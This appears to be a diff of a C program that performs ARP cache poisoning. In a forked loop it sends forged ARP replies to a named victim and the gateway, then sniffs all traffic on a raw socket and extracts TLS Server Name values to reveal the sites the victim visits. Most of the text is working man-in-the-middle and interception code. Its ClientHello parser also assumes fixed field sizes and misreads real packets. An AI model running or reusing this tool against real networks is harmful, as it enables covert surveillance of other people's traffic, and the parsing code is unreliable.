@@ -19,10 +19,7 @@
 #include <netinet/ip_icmp.h>
 
 /* get packet from kernel use raw socket */
-void extract_ethernet_frame(unsigned char* , int);
-void extract_ip_header(unsigned char* buffer, int size, int pointer);
-void extract_icmp_packet(unsigned char* buffer, int size, int pointer);
-void extract_tcp_packet(unsigned char* buffer, int size, int pointer);
+void get_tls_record(unsigned char* buffer, int size);
 
 
 /* constant values */
@@ -38,6 +35,7 @@ void extract_tcp_packet(unsigned char* buffer, int size, int pointer);
 #define ARP_OPER_REPLY 2  /* ARP reply */
 
 #define BUFFSIZE 65536
+#define MAX_PACKET_SIZE 65536
 
 /* Ethernet frame struct */
 typedef struct
@@ -60,6 +58,41 @@ typedef struct
     unsigned char tha[MAC_ADDR_LEN];    /* target hardware address */
     unsigned char tpa[IPv4_ADDR_LEN];   /* target protocol address */
 } arpheader_t;
+
+typedef struct __attribute__((packed)) {
+    uint8_t content_type;  // 0x16 for TLS handshake
+    uint16_t version;
+    uint16_t length;
+} TLSRecord;
+
+typedef struct __attribute__((packed)) {
+    uint8_t handshake_type;  // 0x01 for Client Hello
+    uint8_t length[3];
+    uint16_t version;
+    uint8_t random[32];  // Random data
+    uint8_t session_id_length;
+    uint8_t session_id[32];  // Session ID (variable length)
+    uint16_t cipher_suites_length;
+    uint16_t cipher_suites[16];  // Supported cipher suites (variable length)
+    uint8_t compression_methods_length;
+    uint8_t compression_methods[1];  // Supported compression methods (variable length)
+    uint16_t extensions_length;
+    uint8_t extensions[1024];  // Extensions (variable length)
+} ClientHello;
+
+typedef struct __attribute__((packed)){
+    uint16_t extension_type;        // 0x0000: server_name
+    uint16_t extension_length;
+    uint8_t extension_data[1024];
+} Extension;
+
+typedef struct __attribute__((packed)) {
+    uint16_t server_name_list_length;
+    uint8_t server_name_type;   //0x00: server name type=host_name
+    uint16_t server_name_length;
+    uint8_t server_name[256];   
+} ServerName;
+
 
 unsigned char localMAC[MAC_ADDR_LEN];   /* local MAC address */
 struct in_addr localIP;                 /* local IP address */
@@ -367,134 +400,98 @@ int sendGratuitousArpReply(const struct in_addr destIP, const unsigned char* des
 }
 
 /* ARP cache poisoning infinite loop */
-void poisonArp(const struct in_addr victimIP, const unsigned char* victimMAC, const struct in_addr gatewayIP, const unsigned char* gatewayMAC)
-{
-    while (1)
-    {
-        if(sendGratuitousArpReply(victimIP, victimMAC, gatewayIP, localMAC) < 0)
-        {
-            printf("Sending ARP reply to victim failed\n");
-        }
-        else
-        {
-            printf("Sent ARP reply to victim\n");
-            //Creates a raw socket, that accepts packets.
-            int r_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-            if (r_sock == -1){
-                perror("Socket creation failed.\n");
-                exit(1);         
+void poisonArp(const struct in_addr victimIP, const unsigned char* victimMAC, const struct in_addr gatewayIP, const unsigned char* gatewayMAC){
+    pid_t pid = fork();
+    if (pid == 0){      // child process
+        while (1){
+            if (sendGratuitousArpReply(victimIP, victimMAC, gatewayIP, localMAC) < 0){
+                printf("\nSend ARP reply to victim failed \n");
             }
-            //Create a buffer to accept incomming packets.
-            int packet_size;
-            unsigned char *buffer = (unsigned char *)malloc(65536);
+            // else{
+            //     printf("\nSend ARP reply to victim \n");
+            // }
 
-            packet_size = recvfrom(r_sock, buffer, 65536, 0, NULL, NULL);
-            if (packet_size = -1){
-                printf("Failed to get packets\n");
+            if (sendGratuitousArpReply(gatewayIP, gatewayMAC, victimIP, localMAC) < 0){
+                printf("Send ARP reply to gateway failed \n ");
             }
-            // Extract data from each packet
-            extract_ethernet_frame(buffer, packet_size);
+            // else{
+            //     printf("Send ARP reply to gateway \n");
+            // }
+            sleep(10);
         }
-
-        if(sendGratuitousArpReply(gatewayIP, gatewayMAC, victimIP, localMAC) < 0)
-        {
-            printf("Sending ARP reply to gateway failed\n");
-        }
-        else
-        {
-            printf("Sent ARP reply to gateway\n");
-        }
-
-        sleep(1);
     }
-    
+    else{       // parent process
+        int sockfd;
+        unsigned char buffer[MAX_PACKET_SIZE];
+        if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1){
+            perror("Socket creation failed.\n");
+            exit(1);
+        }
+        while (1){
+            socklen_t saddr_size = sizeof(struct sockaddr);
+            struct sockaddr saddr;
+            memset(&buffer, 0, MAX_PACKET_SIZE);
+
+            // Receive a packet
+            int data_size = recvfrom(sockfd, buffer, MAX_PACKET_SIZE, 0, &saddr, &saddr_size);
+
+            if (data_size == -1){
+                perror("Could not receive packet");
+                exit(1);
+            }
+            // extract_ethernet_frame(buffer, data_size);
+            get_tls_record(buffer, data_size);
+
+            // for(int i = 0; i < data_size; i++){
+            //     printf("%02X ", buffer[i]);
+            // }
+            // printf("\n\n\n");
+        }
+    }
 }
 
-int total=0;
-struct sockaddr_in source, dest;
 
-/*Ethernet Frame Structure :
-    (Preamable + SDF = 8) | (6) Destination * | (6) Source * | (2) Type *
-*/
-void extract_ethernet_frame(unsigned char* buffer, int size){
-    //Declare pointer called eth to an ethhdr structure;
+void get_tls_record(unsigned char* buffer, int size) {
+    // Skip the Ethernet, IP and TCP headers
     struct ethhdr * eth = (struct ethhdr *)(buffer);
+    unsigned short ethhdrlen = sizeof(struct ethhdr);
+    struct iphdr *iph = (struct iphdr *)(buffer + ethhdrlen);
+    unsigned short iphdrlen = iph->ihl*4;
+    struct tcphdr *tcph = (struct tcphdr *)(buffer + iphdrlen + ethhdrlen);
+    unsigned short tcphdrlen = tcph->doff*4;
 
-    printf("Ethernet Frame: \n");
-    printf("\t  | Source MAC: %.2X-%.2X-%.2X-%.2X-%.2X-%.2X", eth->h_source[0], eth->h_source[1], eth->h_source[2], eth->h_source[3], eth->h_source[4], eth->h_source[5]);
-    printf("    | Destination MAC: %.2X-%.2X-%.2X-%.2X-%.2X-%.2X", eth->h_dest[0], eth->h_dest[1], eth->h_dest[2], eth->h_dest[3], eth->h_dest[4], eth->h_dest[5]);
-    printf("    | Protocol : %d\n", eth->h_proto);
-
-    //Extract the next layer: (IP)
-    int pointer = sizeof(struct ethhdr);
-    extract_ip_header(buffer, size, pointer);
-}
-
-/*IP Header Structure :
-  (4) Version * | (4) Header Length * | (8) Type * |
-  (16) Length Total | (16) Trusted Host ID | (3) Flags | (13) Fragment Offset
-  (8) TTL * | (8) Protocol * | (16) Checksum * | (32) Src Addr * | (32) Dest Addr *
-  (x * 32) Options & Padding.
-*/
-void extract_ip_header(unsigned char* buffer, int size, int pointer){
-    printf("IP Header: \n");
-    //Buffer is a pointer; iphdr located after ethernet header
-    struct iphdr *iph = (struct iphdr*)(buffer + pointer); //Buffer is a pointer;
-
-    //IP length + size of iphdr
-    pointer = pointer + sizeof(struct iphdr) + ((unsigned int)(iph->ihl))*4;
-
-    //Reset the address value; fill with saddr from the ip header.
-    memset(&source, 0, sizeof(source));
-    source.sin_addr.s_addr = iph->saddr;
-    memset(&dest, 0, sizeof(dest));
-    dest.sin_addr.s_addr = iph->daddr;
-
-    printf("\t |IP Version: %d", (unsigned int)iph->version);
-    printf("   |Header Length: %d Bytes", ((unsigned int)(iph->ihl))*4);
-    printf("   |TTL: %d", (unsigned int)iph->ttl);
-    printf("   |Protocol: %d\n", (unsigned int)iph->protocol);
-
-    //inet_ntoa: Accepts Internet address (32-bit quantity in network byte order)
-    //Returns string in dotted notation.
-    printf("\t |SourceIP : %s", inet_ntoa(source.sin_addr));
-    printf("   |Destination IP: %s\n", inet_ntoa(dest.sin_addr));
-
-    int protocol  = (unsigned int)iph->protocol;
-    //Different protocols result in different structures.
-    if (protocol == 1){ //ICMP
-        printf("ICMP\n");
-        extract_icmp_packet(buffer, size, pointer);
-    } else if (protocol == 6){  // TCP
-        printf("TCP\n");
-        extract_tcp_packet(buffer, size, pointer);
+    // Check if the packet is long enough to contain a TLS record
+    if (size < iphdrlen + tcphdrlen + sizeof(TLSRecord) + ethhdrlen) {
+        // printf("Packet is too short for a TLS record\n");
+        return;
     }
-}
 
-/*
-  TCP Packet
-  (16) Source * | (16) Dest * | (32) Sequence Num * | (32) Acknowledgement Num *
-  (var) Data Offset (Header Length) | (6) Reserved | (6) Flags *| (16) Window
-  (16) Checksum | (16) Urgent Pointer | (var) Options | (var) Data 
-*/
-void extract_tcp_packet(unsigned char* buffer, int size, int pointer){
-    struct tcphdr * tcph = (struct tcphdr *)(buffer + pointer);
-    printf("| - Source Port: %u", ntohs(tcph->source));
-    printf(" - Destination Port: %u\n", ntohs(tcph->dest));
-    printf("| - Sequence: %u", tcph->seq);
-    printf("| - Acknowledgement: %u\n",tcph->ack_seq);
-    printf("FLAGS: ");
-    printf("URG: %d, ACK: %d, PSH: %d,", tcph->urg, tcph->ack, tcph->psh);
-    printf(" RST: %d, SYN: %d, FIN: %d\n", tcph->rst, tcph->syn, tcph->fin);
-}
+    // Get the TLS record
+    TLSRecord *tls = (TLSRecord*)(buffer + iphdrlen + tcphdrlen + ethhdrlen);
+    if(tls->content_type == 0x16){
+        // parse_client_hello(buffer + iphdrlen + tcphdrlen + sizeof(TLSRecord) + ethhdrlen, size - iphdrlen - tcphdrlen - sizeof(TLSRecord) - ethhdrlen);
+        ClientHello *client_hello = (ClientHello*)(buffer + iphdrlen + tcphdrlen + sizeof(TLSRecord) + ethhdrlen);
+        if (client_hello->handshake_type == 0x01){          
+            uint8_t *ptr = client_hello->extensions;
+            uint8_t *end = client_hello->extensions + ntohs(client_hello->extensions_length);
+            while (ptr < end){
+                Extension *ext = (Extension*)ptr;
 
-/* ICMP Packet structure:
-    (4) Type * | (4) Code  * | (8) Checksum * | (x*32) Data *
-*/
-void extract_icmp_packet(unsigned char* buffer, int size, int pointer){
-    struct icmphdr * icmp = (struct icmphdr *)(buffer + pointer);
-    printf("ICMP Packet: ");
-    printf("ICMP msgtype=%d, code=%d\n", icmp->type, icmp->code);
+                if (ntohs(ext->extension_type) == 0x0000){
+                    ServerName *server_name = (ServerName*)ext->extension_data;
+                   
+                    printf("Server Name: ");
+                    for (int i = 0; i < ntohs(server_name->server_name_length); i++){
+                        printf("%c", server_name->server_name[i]);
+                    }
+                    printf("\n");
+                }
+
+                ptr += ntohs(ext->extension_length) + 4;                   
+            }
+            
+        }
+    }
 }
 
 
